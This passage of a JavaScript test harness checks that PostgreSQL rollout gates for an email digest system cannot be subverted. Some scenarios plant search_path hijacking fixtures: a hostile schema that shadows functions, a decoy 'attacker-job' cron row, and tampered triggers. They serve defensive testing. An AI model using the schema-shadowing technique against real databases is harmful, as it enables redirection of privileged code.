  await c.query(`UPDATE cron.job SET username = 'someone_else'`);
  {
    const err = await enableEngine();
    rec('enable-engine REFUSES when the job belongs to another role',
      !!err && err.includes('the digest cron job exists'), err ?? 'it proceeded over a foreign job');
  }

  // ── a hostile search_path must not redirect the gate ─────────────────────
  // search_path can be set per ROLE or per DATABASE, which the client-side PG* stripping cannot
  // touch. With `hostile` ahead of pg_temp, an unqualified `_gate_job` resolves to a permanent
  // relation first — and a view that hands the hash assertions a reviewed jobid and the arm a
  // different one puts the arbitrary-job problem straight back. Every reference is therefore
  // schema-qualified; this proves it, by planting exactly that trap.
  await seedBaseline();
  await c.query(`
    DROP SCHEMA IF EXISTS hostile CASCADE;
    CREATE SCHEMA hostile;
    INSERT INTO cron.job (jobname, schedule, command, active)
      VALUES ('attacker-job', '* * * * *', 'SELECT 1', false);
    CREATE TABLE hostile._gate_job AS
      SELECT jobid FROM cron.job WHERE jobname = 'attacker-job';
    -- the operator must be ABLE to reach the trap, or resolution skips the schema and the
    -- scenario proves nothing
    GRANT USAGE ON SCHEMA hostile TO hosted_postgres;
    GRANT ALL ON ALL TABLES IN SCHEMA hostile TO hosted_postgres;`);
  await op.query(`SET search_path = hostile, pg_temp, public`);
  {
    // Run the DRY RUN under the hostile path first — its DROP TABLE IF EXISTS is the statement
    // that could have destroyed the planted permanent table, and asserting preservation without
    // ever invoking it was vacuous: reverting the qualified drop left the scenario green.
    const pfErr = await preflight();
    rec('the read-only preflight survives a hostile search_path', pfErr === null, pfErr ?? '');
    const survived = await c.query(`SELECT to_regclass('hostile._gate_job') IS NOT NULL AS ok`);
    rec('...and did NOT drop the permanent table of that name', survived.rows[0].ok === true);
    const err = await activate();
    rec('a hostile search_path cannot redirect the gate to another job',
      err === null, err ?? '');
    const armed = (await c.query(
      `SELECT jobname FROM cron.job WHERE active`)).rows.map((r) => r.jobname);
    rec('...and the job it armed is the reviewed one, not the planted one',
      armed.length === 1 && armed[0] === 'notification-digest-worker',
      `armed: ${JSON.stringify(armed)}`);
    // The planted permanent table must still be there — if the "read-only" preflight's DROP had
    // resolved through search_path it would have destroyed a real table.
    const still = await c.query(`SELECT to_regclass('hostile._gate_job') IS NOT NULL AS ok`);
    rec('...and the preflight never dropped the permanent table of that name', still.rows[0].ok === true);
  }
  await op.query(`SET search_path = "$user", public`);
  await c.query(`DROP SCHEMA hostile CASCADE`);

  // ── postflight: the after-activation proof, executed ─────────────────────
  const postflight = async (win = 60) => (await runArtifact('postflight.sql', { window_minutes: win })).err ?? null;
  {
    // the baseline world is a healthy, freshly-canaried system — but the cron is still INACTIVE,
    // and postflight runs AFTER activation, so it must say so rather than pass
    await seedBaseline();
    const err = await postflight();
    rec('postflight REFUSES while the job is not armed (it runs after activation, not before)',
      !!err && err.includes('the digest cron is ARMED'), err ?? 'it passed');
  }
  {
    await seedBaseline();
    await c.query(`UPDATE cron.job SET active = true`);
    const err = await postflight();
    rec('postflight PASSES on an armed, healthy, freshly-succeeded system', err === null, err ?? '');
  }
  // THE INVARIANT, read from the ledger rather than from the code: a pre-boundary row that was
  // SENT is exactly what the whole programme exists to make impossible, so postflight must be the
  // thing that would have caught it.
  await refusesPostflight('postflight CATCHES a pre-boundary row that was sent',
    async () => {
      await c.query(`UPDATE cron.job SET active = true`);
      // the shipped email:instant boundary is UNBOUNDED, so nothing predates it — this scenario
      // is about a path with a REAL boundary, which is what an activated digest path has
      await c.query(`ALTER TABLE public.notification_activation_boundaries DISABLE TRIGGER trg_notif_activation_boundary_guard;
                     UPDATE public.notification_activation_boundaries
                        SET boundary_at = now() - interval '1 hour' WHERE path = 'email:instant';
                     ALTER TABLE public.notification_activation_boundaries ENABLE TRIGGER trg_notif_activation_boundary_guard;`);
      await c.query(
        `INSERT INTO public.notification_outbox (channel, event_type, template_key, status,
           destination_normalized, scheduled_for, payload, idempotency_key, recipient_user_id, created_at)
         VALUES ('email','ev_test','tpl','sent','x@example.com', now(), '{}'::jsonb, gen_random_uuid()::text,
                 '22222222-2222-4222-8222-222222222222', now() - interval '9 hours')`);
    }, 'NO-BACKLOG HELD');
  await refusesPostflight('postflight CATCHES a stale worker (nothing has succeeded in the window)',
    async () => {
      await c.query(`UPDATE cron.job SET active = true`);
      await c.query(`UPDATE public.notification_worker_runs SET ended_at = now() - interval '3 hours',
                        started_at = now() - interval '3 hours' - interval '1 minute'`);
    }, 'inside the watch window');
  await refusesPostflight('postflight CATCHES a killed channel',
    async () => {
      await c.query(`UPDATE cron.job SET active = true`);
      await c.query(`INSERT INTO public.notification_channel_kill_switches (channel, reason, request_id)
                     VALUES ('email','incident', gen_random_uuid())`);
    }, 'no channel is killed');
  await refusesPostflight('postflight CATCHES a drifted job command',
    async () => {
      await c.query(`UPDATE cron.job SET active = true, command = command || ' -- drifted'`);
    }, 'EXACTLY the reviewed command');

  // ── stage-event: every digest stage after the first ──────────────────────
  // a stage runs on an OPEN path; opening it is enable-engine's job, and the baseline (a migrated
  // database) has it inert, so each scenario opens it through the real RPC first
  const openDigestPath = async () => {
    const st = (await c.query(
      `SELECT state FROM public.notification_activation_boundaries WHERE path='email:digest'`)).rows[0];
    if (st?.state !== 'active') {
      await c.query(
        `SELECT public.record_notification_activation_boundary('email:digest','harness: staged activation', gen_random_uuid())`);
    }
  };
  const stageEvent = async (key = 'ev_stage') => (await runArtifact('enable_event.sql', { event_key: key })).err ?? null;
  {
    await seedBaseline();
    await c.query(`INSERT INTO public.notification_event_types (key, supports_digest, digest_engine_enabled, digest_cutover)
                   VALUES ('ev_stage', true, false, true) ON CONFLICT (key) DO UPDATE
                     SET digest_engine_enabled = false, digest_cutover = true`);
    await openDigestPath();
    // the baseline cron is INACTIVE: a stage is not an activation, and it must say so
    const notArmed = await stageEvent();
    rec('stage-event REFUSES while the cron is not armed (a stage adds to a RUNNING path)',
      !!notArmed && notArmed.includes('the digest cron is ARMED'), notArmed ?? 'it passed');
    await c.query(`UPDATE cron.job SET active = true`);
    const err = await stageEvent();
    rec('stage-event enables one more event on an open, armed, healthy path', err === null, err ?? '');
    const on = (await c.query(`SELECT key FROM public.notification_event_types WHERE digest_engine_enabled ORDER BY key`)).rows;
    rec('...and the earlier stage stays enabled beside it',
      on.map((r) => r.key).join(',') === 'ev_stage,open_slots_player', JSON.stringify(on));
    const twice = await stageEvent();
    rec('...while a second run of the SAME stage refuses rather than silently doing nothing',
      !!twice && twice.includes('not already enabled'), twice ?? 'it passed');
  }
  const refusesStage = async (name, mutate, needle) => {
    await seedBaseline();
    await c.query(`INSERT INTO public.notification_event_types (key, supports_digest, digest_engine_enabled, digest_cutover)
                   VALUES ('ev_stage', true, false, true) ON CONFLICT (key) DO UPDATE
                     SET digest_engine_enabled = false, digest_cutover = true`);
    await openDigestPath();
    await c.query(`UPDATE cron.job SET active = true`);
    try { await mutate(); }
    catch (e) { return rec(name, false, `the scenario's own setup failed: ${e.message}`); }
    const err = await stageEvent();
    if (!err) return rec(name, false, 'the stage PASSED — it does not cover this');
    rec(name, err.includes(needle), err.includes(needle) ? '' : `refused for the wrong reason: ${err}`);
  };
  await refusesStage('stage-event REFUSES while a channel is killed',
    () => c.query(`INSERT INTO public.notification_channel_kill_switches (channel, reason, request_id)
                   VALUES ('email','incident', gen_random_uuid())`), 'no channel is killed');
  await refusesStage('stage-event REFUSES while a circuit is open',
    () => c.query(`UPDATE public.notification_provider_circuit SET state = 'open', reason='provider_5xx', tripped_at = now()`),
    'circuit is CLOSED');
  await refusesStage('stage-event REFUSES while the worker has not succeeded recently',
    () => c.query(`UPDATE public.notification_worker_runs SET ended_at = now() - interval '5 hours'`),
    'SUCCEEDED within the last hour');
  await refusesStage('stage-event REFUSES an event that never opted into digesting',
    () => c.query(`UPDATE public.notification_event_types SET digest_cutover = false WHERE key = 'ev_stage'`),
    'digest_cutover event');
  await refusesStage('stage-event REFUSES while the delivery path is still inert',
    () => c.query(`ALTER TABLE public.notification_activation_boundaries DISABLE TRIGGER trg_notif_activation_boundary_guard;
                   UPDATE public.notification_activation_boundaries
                      SET state='inert', boundary_at=NULL, request_id=NULL, reason=NULL WHERE path='email:digest';
                   ALTER TABLE public.notification_activation_boundaries ENABLE TRIGGER trg_notif_activation_boundary_guard;`),
    'already OPEN');

  // ── assert-inert: the gate that must run BEFORE any switch ───────────────
  await seedBaseline();
  await c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false`);
  {
    const err = await assertInert();
    rec('assert-inert PASSES on a fresh, inactive, nothing-enabled world', err === null, err ?? '');
  }
  // THE WINDOW IT CLOSES: a job left ARMED by an earlier rollout would tick the moment the engine
  // was enabled — before the controlled canary, before the monitor was watching.
  await seedBaseline();
  await c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false;
                 UPDATE cron.job SET active = true`);
  {
    const err = await assertInert();
    rec('assert-inert REFUSES an already-ARMED job before any switch is touched',
      !!err && err.includes('still INACTIVE'), err ?? 'it PASSED');
  }
  await seedBaseline();
  await c.query(`UPDATE cron.job SET schedule = '*/1 * * * *';
                 UPDATE public.notification_event_types SET digest_engine_enabled = false`);
  {
    const err = await assertInert();
    rec('assert-inert REFUSES a job that is not the reviewed one',
      !!err && err.includes('the cron schedule is the reviewed one'), err ?? 'it PASSED');
  }
  await seedBaseline();
  {
    const err = await assertInert();
    rec('assert-inert REFUSES once an engine is already enabled',
      !!err && err.includes('no event has the digest engine enabled yet'), err ?? 'it PASSED');
  }

  // ── enable-engine: guarded, single-row, and refuses over an armed cron ───
  await seedBaseline();
  await c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false`);
  // the digest path starts CLOSED, as a migrated database does
  await c.query(`ALTER TABLE public.notification_activation_boundaries DISABLE TRIGGER trg_notif_activation_boundary_guard;
                 UPDATE public.notification_activation_boundaries
                    SET state='inert', boundary_at=NULL, request_id=NULL, reason=NULL WHERE path='email:digest';
                 ALTER TABLE public.notification_activation_boundaries ENABLE TRIGGER trg_notif_activation_boundary_guard;`);
  const bndReq = randomUUID();
  {
    const before = (await c.query(`SELECT state FROM public.notification_activation_boundaries WHERE path='email:digest'`)).rows[0];
    const err = await enableEngine(bndReq);
    rec('enable-engine turns the cutover event ON', err === null, err ?? '');
    const on = (await c.query(`SELECT key FROM public.notification_event_types WHERE digest_engine_enabled`)).rows;
    rec('...and ONLY that event', on.length === 1 && on[0].key === 'open_slots_player', JSON.stringify(on));
    // N5: routing and the boundary move TOGETHER. Enabling routing without opening the path would
    // form groups from whatever is already pending — the flood the contract exists to prevent.
    const after = (await c.query(
      `SELECT state, boundary_at, request_id FROM public.notification_activation_boundaries WHERE path='email:digest'`)).rows[0];
    rec('...and OPENS the email:digest delivery path in the same transaction',
      before.state === 'inert' && after.state === 'active' && after.boundary_at !== null,
      `${before.state} -> ${after.state} at ${after.boundary_at}`);
    rec('...recording the request id the runbook printed, so an ambiguous retry replays it',
      after.request_id === bndReq, `${after.request_id} vs ${bndReq}`);
  }
  // Re-running is not a silent no-op. With a NEW request id it is refused at the boundary: the
  // path is already open, and this step must not enable routing against a boundary another
  // request established.
  {
    const err = await enableEngine();
    rec('enable-engine REFUSES a second time with a NEW request id',
      !!err && err.includes('must not ride on a boundary it cannot account for'), err ?? 'it passed');
  }
  // …while the EXACT replay — the ambiguous-commit recovery the runbook advertises — SUCCEEDS.
  // Before round 2 it could not: the event was already enabled, so the one-row assertion aborted
  // every retry and --boundary-request-id was advice that could not be followed.
  {
    const err = await enableEngine(bndReq);
    rec('...and the EXACT replay (same boundary request id) succeeds — the advertised recovery',
      err === null, err ?? '');
    const after = (await c.query(
      `SELECT boundary_at, request_id FROM public.notification_activation_boundaries WHERE path='email:digest'`)).rows[0];
    rec('...leaving the boundary exactly where it was', after.request_id === bndReq, `${after.request_id}`);
  }
  // THE ORDERING INVARIANT: never enable the engine while the cron is armed.
  await seedBaseline();
  await c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false;
                 UPDATE cron.job SET active = true`);
  {
    const err = await enableEngine();
    rec('enable-engine REFUSES while the cron is ARMED', !!err && err.includes('or is ARMED'),
      err ?? 'it passed');
    const on = (await c.query(`SELECT count(*)::int AS n FROM public.notification_event_types WHERE digest_engine_enabled`)).rows[0].n;
    rec('...and the transaction rolled back, so nothing is enabled', on === 0, `enabled=${on}`);
  }

  // ── canary_verify carries the same guards ────────────────────────────────
  await seedBaseline();
  await c.query(`UPDATE public.notification_digest_attempts
    SET provider_message_id = 'resend-msg-DIFFERENT' WHERE attempt_id = '${ATTEMPT}'`);
  {
    const err = await canaryVerify();
    rec('canary_verify ALSO refuses a correlation mismatch',
      !!err && err.includes('disagrees with its group about the provider message id'), err ?? 'it PASSED');
  }

  // An accepted attempt is a fact about the moment the provider answered and never changes. A
  // bounce arriving just after the run finished moves the group to failed_terminal while leaving
  // the attempt accepted, the ids correlated, the circuit closed and the orphan queue empty — so
  // every other canary assertion passes over a canary that did not deliver.
  await seedBaseline();
  // A HISTORICAL sent group from ANOTHER run is planted first. Without it the scenario proves only
  // "some group is sent" and would stay green with the `worker_run_id = :run_id` predicate removed
  // — the whole defect this slice began with, re-created inside its own test.
  await c.query(`
    INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at, ended_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', 'succeeded',
              now() - interval '10 minutes', now() - interval '9 minutes');
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at,
       state, provider_message_id, provider_status, provider_status_rank)
      VALUES ('33333333-3333-4333-8333-333333333333', '{"k":7}'::jsonb, 'hash-7', 'email',
              'open_slots_player', 'rk-7', 'fp-7', 'Europe/Amsterdam', now(), now(),
              'sent', 'resend-msg-OLD-ROLLOUT', 'sent', 1);
    INSERT INTO public.notification_digest_attempts
      (attempt_id, digest_group_id, worker_run_id, provider_idempotency_key,
       outcome_class, provider_message_id, recorded_at, http_status)
      VALUES ('bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb', '33333333-3333-4333-8333-333333333333',
              '${OTHER_RUN}', 'idem-old', 'accepted', 'resend-msg-OLD-ROLLOUT', now(), 200);
    UPDATE public.notification_digest_groups SET state = 'failed_terminal' WHERE id = '${GROUP}'`);
  {
    const err = await canaryVerify();
    rec('canary_verify refuses a group that has since FAILED despite the accepted attempt',
      !!err && err.includes('is STILL sent'), err ?? 'it PASSED');
    rec('...and an OLD rollout\'s sent group does not satisfy it',
      !!err && err.includes('is STILL sent'), err ?? '');
  }

  // ...and the canary's orphan check must be scoped to THIS run too. An orphan against a group only
  // another run attempted is not this canary's problem; without the run predicate the assertion
  // degrades to "no orphans anywhere" and this scenario is what notices.
  await seedBaseline();
  await c.query(`
    INSERT INTO public.notification_worker_runs
      (run_id, worker, channel, phase, status, started_at, ended_at)
      VALUES ('${OTHER_RUN}', 'notification-digest-worker', 'email', 'dispatch', 'succeeded',
              now() - interval '10 minutes', now() - interval '9 minutes');
    INSERT INTO public.notification_digest_groups
      (id, canonical_group_key, group_key_hash, channel, event_type, recipient_key,
       destination_fingerprint, recipient_timezone, digest_boundary_at, available_at, state)
      VALUES ('44444444-4444-4444-8444-444444444444', '{"k":6}'::jsonb, 'hash-6', 'email',
              'open_slots_player', 'rk-6', 'fp-6', 'Europe/Amsterdam', now(), now(), 'no_work');
    INSERT INTO public.notification_digest_attempts
      (attempt_id, digest_group_id, worker_run_id, provider_idempotency_key, outcome_class, recorded_at)
      VALUES ('cccccccc-cccc-4ccc-8ccc-cccccccccccc', '44444444-4444-4444-8444-444444444444',
              '${OTHER_RUN}', 'idem-6', 'ambiguous', now());
    INSERT INTO public.notification_provider_events
      (resend_event_id, provider_message_id, digest_group_id, status, occurred_at)
      VALUES ('evt-other-run', 'resend-msg-OTHER-RUN', NULL, 'delivered', now());
    INSERT INTO public.notification_orphan_reconcile_state
      (resend_event_id, channel, digest_group_id, next_eligible_at)
      VALUES ('evt-other-run', 'email', '44444444-4444-4444-8444-444444444444', now())`);
  {
    const err = await canaryVerify();
    rec('canary_verify ALLOWS an orphan bound only to another run\'s group', err === null, err ?? '');
  }

  // The canary subcommand prints "reconciled AND verified to have delivered". It must not say that
  // over an orphan the webhook left un-quarantined against this canary's own group — activation
  // would still catch it, but the operator's verdict at canary time would have been false.
  await seedBaseline();
  await c.query(`
    INSERT INTO public.notification_provider_events
      (resend_event_id, provider_message_id, digest_group_id, status, occurred_at)
      VALUES ('evt-canary-orphan', 'resend-msg-SOMETHING-ELSE', NULL, 'delivered', now());
    INSERT INTO public.notification_orphan_reconcile_state
      (resend_event_id, channel, digest_group_id, next_eligible_at)
      VALUES ('evt-canary-orphan', 'email', '${GROUP}', now())`);
  {
    const err = await canaryVerify();
    rec('canary_verify refuses an un-quarantined orphan on this canary\'s group',
      !!err && err.includes('still unreconciled against a group this canary sent'), err ?? 'it PASSED');
  }

  // ── canary-invoke: the step that actually SENDS ──────────────────────────
  // Every scenario here checks TWO things: that the refusal names the right assertion, and that
  // NOTHING WAS QUEUED. A gate on a sending step that refuses loudly and posts anyway is worse than
  // no gate, and only a real server — with the reviewed command really executing against a real
  // pg_net shape — can tell the two apart.
  const queuedCount = async () =>
    (await c.query(`SELECT count(*)::int AS n FROM net.http_request_queue`)).rows[0].n;

  const invokeRefuses = async (name, mutate, needle) => {
    await seedBaseline();
    try { await mutate(); }
    catch (e) { return rec(name, false, `the scenario's own setup failed: ${e.message}`); }
    // Measured against the world the SCENARIO built, not against zero: one scenario plants a queued
    // request of its own, and comparing to zero would report that plant as a send.
    const before = await queuedCount();
    const err = await canaryInvoke();
    if (!err) return rec(name, false, 'the invocation PASSED — it would have SENT');
    if (!err.includes(needle)) return rec(name, false, `refused for the wrong reason: ${err}`);
    const after = await queuedCount();
    rec(name, after === before, after === before ? '' : `it refused but queued ${after - before} request(s) anyway`);
  };

  // ── C-3: the DUE-WORK FLOOR ──────────────────────────────────────────────
  //
  // THIS SCENARIO USED TO BE THE SUITE'S POSITIVE CONTROL, and it was the defect. The baseline is
  // an inert, engine-on, quiet world with NOTHING due: the worker would start, materialize nothing,
  // claim nothing, and end `succeeded` having sent to nobody. The old assertion called that a pass.
  // It is now the first refusal — an empty run is not a canary, it is the state a canary exists to
  // distinguish, reached by a different route and paid for with the one controlled invocation the
  // rollout gets.
  await seedBaseline();
  {
    const before = await queuedCount();
    const err = await canaryInvoke();
    rec('canary-invoke REFUSES an engine-on, quiet world with ZERO due cutover work',
      !!err && err.includes('NO due, claimable open_slots_player'),
      err ?? 'it PASSED — it would have queued a request for an EMPTY dispatch run');
    rec('...and queued nothing', await queuedCount() === before, `queued=${await queuedCount() - before}`);
    // the refusal has to be ACTIONABLE, not merely correct: an operator who cannot tell why the
    // world is empty will raise --max-recipients (the ceiling) and be refused again for a reason
    // that has nothing to do with it
    rec('...naming the empty-run consequence and the causes worth checking',
      !!err && err.includes('EMPTY dispatch run') && err.includes('quiet hours')
        && err.includes('circuit') && err.includes('leased'), err ?? '');
    rec('...and no invocation row was opened for a request that was never going to send',
      (await c.query(`SELECT count(*)::int n FROM public.notification_worker_invocations
                       WHERE status IN ('pending','started')`)).rows[0].n === 0);
  }

  // ...and the same world with EXACTLY ONE due cutover item is the positive control. Everything
  // below it — endpoint, Vault bearer, invocation naming — is unchanged; only the fixture grew the
  // one due group that makes the invocation mean something.
  await seedBaseline();
  await seedDueCutoverGroup();
  {
    const err = await canaryInvoke();
    rec('canary-invoke PASSES on an inert, engine-on, quiet world with exactly ONE due cutover item',
      err === null, err ?? '');
    rec('...and queues EXACTLY one request', await queuedCount() === 1, `queued=${await queuedCount()}`);
    // THE POINT OF THE WHOLE DESIGN: what ran is the job's own reviewed command, not a transcription.
    // Both facts below come from the request the command itself made — the endpoint it names, and a
    // bearer it could only have got by reading Vault at execution time.
    const q = (await c.query(`SELECT url, headers ->> 'Authorization' AS auth, body ->> 'invocation_id' AS inv FROM net.http_request_queue`)).rows[0];
    rec('...to the REVIEWED endpoint, taken from the job command itself',
      q?.url === 'https://ficwbdrzefmblkbkomzw.supabase.co/functions/v1/notification-digest-worker', q?.url ?? 'no request');
    rec('...carrying a bearer resolved from Vault at execution time',
      q?.auth === 'Bearer stub-key-not-a-real-credential', q?.auth ?? 'no Authorization header');
    // ROUND 5, the whole point: the request NAMES the invocation the artifact just opened, so the
    // run it starts can own that invocation and no other request can. The command is byte-identical
    // for a cron tick — which is why the body is built at execution time rather than hard-coded.
    const inv = (await c.query(
      `SELECT id::text FROM public.notification_worker_invocations WHERE status = 'pending'`)).rows[0]?.id;
    rec('...and NAMING the invocation this artifact opened, so only its own run can claim it',
      !!inv && q?.inv === inv, `body invocation_id=${q?.inv ?? 'null'} pending=${inv ?? 'none'}`);
  }

  // ...while a TICK of the same command names nothing — INCLUDING the interleaving that defeated
  // the round-5 subquery: pg_cron selects a due execution while the job is active, the job is
  // deactivated, the artifact opens and COMMITS an invocation, and only then does the selected
  // tick begin its statement. A body that reads committed state would name that invocation; a
  // body that reads the EXECUTING TRANSACTION cannot, because pg_cron runs its own session.
  await seedBaseline();
  {
    const jobCmd = (await c.query(`SELECT command FROM cron.job WHERE jobname='notification-digest-worker'`)).rows[0].command;
    await c.query(jobCmd);                    // exactly what pg_cron executes on a tick
    const body = (await c.query(`SELECT body ->> 'invocation_id' AS inv FROM net.http_request_queue ORDER BY id DESC LIMIT 1`)).rows[0];
    // "nothing" is NULL, or the empty string a session keeps after a transaction-local set_config
    // was reset at COMMIT. The worker's uuid check rejects both — a request must NAME an
    // invocation to own one, and neither of these does.
    rec('a plain TICK of the same command names NO invocation', !body?.inv, `body invocation_id=${JSON.stringify(body?.inv)}`);

    // the LATE-STARTING tick, with an invocation already open and committed
    const open = await c.query(
      `SELECT public.open_notification_worker_invocation('smoke', 'smoke_invoke.sql', gen_random_uuid()) AS id`);
    await c.query(jobCmd);                    // the same text, a session that published nothing
    const late = (await c.query(`SELECT body ->> 'invocation_id' AS inv FROM net.http_request_queue ORDER BY id DESC LIMIT 1`)).rows[0];
    rec('a LATE-STARTING tick still names nothing, even with an invocation already pending',
      !late?.inv, `body invocation_id=${JSON.stringify(late?.inv)} (pending ${open.rows[0].id})`);
    // …and the artifact's own transaction, which publishes the id, DOES name it
    await c.query('BEGIN');
    await c.query(`SELECT pg_catalog.set_config('notif.dispatch_invocation', $1, true)`, [open.rows[0].id]);
    await c.query(jobCmd);
    const mine = (await c.query(`SELECT body ->> 'invocation_id' AS inv FROM net.http_request_queue ORDER BY id DESC LIMIT 1`)).rows[0];
    await c.query('COMMIT');
    rec('...and the transaction that PUBLISHED the id names exactly that invocation',
      mine?.inv === open.rows[0].id, `body invocation_id=${mine?.inv}`);
  }

  // ── the bearer must survive a hostile search_path, twice over ────────────
  // `hostile` is placed BEFORE pg_catalog and pg_catalog is named EXPLICITLY, because the tempting
  // wrong test omits pg_catalog — PostgreSQL then searches it implicitly first and the scenario
  // passes without proving anything. Two facts are asserted: the shadow schema captured nothing, and
  // the request still carries the real Vault bearer. The first alone would pass if the command had
  // simply failed to run.
  // EVERY artifact, not just the invoker: `_job_identity_assertions.sql` alone calls count, md5,
  // btrim, regexp_replace, regexp_matches and current_setting unqualified, and a lying md5 makes the
  // whole-command hash match anything. The gates must behave identically under a hostile path or
  // they are not gates.
  for (const path of ['shadow, pg_catalog, public', 'shadow, public']) {
    for (const [what, run] of [
      // C-3: the due-work floor is part of this artifact now, so the fixture has to give it real
      // work or every hostile-path run below would refuse for a reason that is not the path. The
      // seed goes through the SUPERUSER connection, which never carries the hostile path — the same
      // device the assert-inert and smoke_invoke entries already use.
      ['canary-invoke', async () => { await seedDueCutoverGroup(); return canaryInvoke(); }],
      ['assert-inert', async () => { await c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false`); return assertInert(); }],
      ['the activation preflight', preflight],
      ['canary_verify', canaryVerify],
      ['canary_scope_verify', scopeVerify],
      // the disabled smoke runs the same stored command and was missed by this sweep when it landed
      // the counter capture belongs here too: it has unqualified operators of its own, and a path
      // reset that slipped past the acknowledged partial text scan would corrupt its markers silently
      ['smoke_counters', async () => (await runArtifact('smoke_counters.sql')).err ?? null],
      ['smoke_invoke', async () => {
        await c.query(`UPDATE public.notification_event_types SET digest_engine_enabled = false`);
        await c.query(`DELETE FROM public.notification_digest_groups WHERE terminal_at IS NULL`);
        return smokeInvoke();
      }],
      // ...and the one that ARMS. A hostile md5 makes the whole-command hash match any command, so
      // without this the gate that decides "this is the reviewed job" is the one gate never checked
      // under a hostile path.
      ['activate', activate],
    ]) {
      await seedBaseline();
      await c.query(`DELETE FROM shadow.captured`);
      // the hostile path is set on the OPERATOR session — the one the artifacts run on
      await op.query(`SET search_path = ${path}`);
      let err = null;
      try { err = await run(); } finally { await op.query(`SET search_path = "$user", public`); }
      const captured = (await c.query(`SELECT count(*)::int AS n FROM shadow.captured`)).rows[0].n;
      rec(`${what} still PASSES under search_path = ${path}`, err === null, err ?? '');
      rec(`...and nothing shadowed was reached (${what} / ${path})`, captured === 0, `captured=${captured}`);
    }
    // ...and the invoker's request must carry the REAL bearer, not one a shadowed name rewrote.
    await seedBaseline();
    await seedDueCutoverGroup();
    await op.query(`SET search_path = ${path}`);
    try { await canaryInvoke(); } finally { await op.query(`SET search_path = "$user", public`); }
    const q = (await c.query(
      `SELECT url, headers ->> 'Authorization' AS a FROM net.http_request_queue`)).rows[0];
    rec(`...and the real Vault bearer still reaches the request (${path})`,
      q?.a === 'Bearer stub-key-not-a-real-credential', q?.a ?? 'no Authorization header');
    rec(`...at the reviewed endpoint (${path})`,
      q?.url === 'https://ficwbdrzefmblkbkomzw.supabase.co/functions/v1/notification-digest-worker',
      q?.url ?? 'no request');
  }

  // ── does the scheduled command resolve ANY name through search_path? ─────
  //
  // ASK THE SERVER, AND ASK IT FOR THE TREE. Three review rounds went into this one question, and
  // every intermediate answer was wrong in a way worth recording so nobody re-derives them:
  //
  //   * A REGEX over the command text is a partial parser. It missed `=`, then LIKE / IN / BETWEEN /
  //     CAST(x AS t) / typed literals. This slice already deleted one partial parser; it does not
  //     get to keep another.
  //   * An EMPTY search_path proves nothing: pg_catalog is searched implicitly whatever the path
  //     says, so a bare `=` resolves happily and looks safe. Measured.
  //   * pg_depend is BLIND: objects created by initdb are pinned and get no dependency rows, so a
  //     dependency scan of this command returns only net.http_post and vault.decrypted_secrets and
  //     would pass with every pg_catalog qualification removed. Measured.
  //   * pg_get_viewdef is NOT identity-preserving. PostgreSQL renders some resolved operators as
  //     syntax — `IS DISTINCT FROM`, `CASE x WHEN y` — so the deparse is byte-identical even when
  //     the underlying `opno` has been redirected. Measured, and it is why this is not that.
  //
  // What IS exact is the stored rewrite tree. `pg_rewrite.ev_action` is the parse tree with OIDs in
  // it — every `opno`, `funcid` and `casttype` the planner actually bound. Build the view under an
  // empty path, keep that tree, then rebuild it with a hostile schema first and compare. Identical
  // trees mean identical resolution, syntax-hidden operators included.
  //
  // ...and the CANDIDATES ARE DERIVED FROM THAT TREE, not from a list. Every OID the neutral tree
  // names is looked up in pg_operator / pg_proc / pg_type and re-created in `redirect` with the SAME
  // signature, so the hostile build has an exact-match rival for each. Anything that cannot be
  // shadowed is REPORTED rather than skipped, because a silent gap is how the last two versions of
  // this check passed while covering less than they claimed.
  {
    const CMD_SELECT = REVIEWED.command.trim().replace(/;\s*$/, '');
    // CREATE OR REPLACE, never DROP + CREATE. A review round asked whether the view's own OID could
    // make this comparison flaky. It cannot, and that was measured rather than assumed: the _RETURN
    // rule references OLD/NEW by rangetable INDEX, the tree never contains the view's own OID, and
    // two builds with OID advancement forced in between are byte-identical. Replacing rather than
    // recreating keeps the OID fixed anyway — a property that holds structurally beats one that only
    // holds when measured.
    let viewExists = false;
    const buildUnder = async (path) => {
      await c.query(`SET search_path = ${path}`);
      await c.query(`CREATE ${viewExists ? 'OR REPLACE ' : ''}VIEW public._cmd_ast AS ${CMD_SELECT}`);
      viewExists = true;
      await c.query(`SET search_path = "$user", public`);
      const { rows } = await c.query(`
        SELECT r.ev_action, pg_get_viewdef('public._cmd_ast'::regclass, true) AS def
          FROM pg_rewrite r WHERE r.ev_class = 'public._cmd_ast'::regclass`);
      return rows[0];
    };

    await c.query(`DROP SCHEMA IF EXISTS redirect CASCADE; CREATE SCHEMA redirect`);
    const neutral = await buildUnder("''");
    // WHICH NUMBERS ARE OIDS: classify the FIELDS, and fail on one nobody has classified.
    //
    // Naming four fields (opno, funcid, opfuncid, casttype) was a partial parser of pg_node_tree, and
    // a review round listed what it missed — consttype, resulttype, aggfnoid, winfnoid, relid,
    // collOid, eqop, sortop. Treating EVERY integer as a candidate instead does not work either: it
    // was measured, and small non-OID values (rangetable indexes, varattno, flags) collide with real
    // pg_catalog entries whose signatures cannot be shadowed at all — cstring and internal arguments,
    // non-base types — so the check went red over coincidences.
    //
    // So neither guess. Every field name PRESENT IN THE TREE is enumerated and must be classified as
    // OID-bearing or inert; an unclassified one FAILS BY NAME. The lists below are then a statement
    // about this tree that the test keeps honest, rather than a guess about PostgreSQL that quietly
    // rots. A new node type introducing a new OID field says so instead of passing.
    const OID_FIELDS = {
      opno: ['pg_operator', 'oprnamespace'], opfuncid: ['pg_proc', 'pronamespace'],
      funcid: ['pg_proc', 'pronamespace'], aggfnoid: ['pg_proc', 'pronamespace'],
      winfnoid: ['pg_proc', 'pronamespace'], eqop: ['pg_operator', 'oprnamespace'],
      sortop: ['pg_operator', 'oprnamespace'],
      consttype: ['pg_type', 'typnamespace'], vartype: ['pg_type', 'typnamespace'],
      funcresulttype: ['pg_type', 'typnamespace'], opresulttype: ['pg_type', 'typnamespace'],
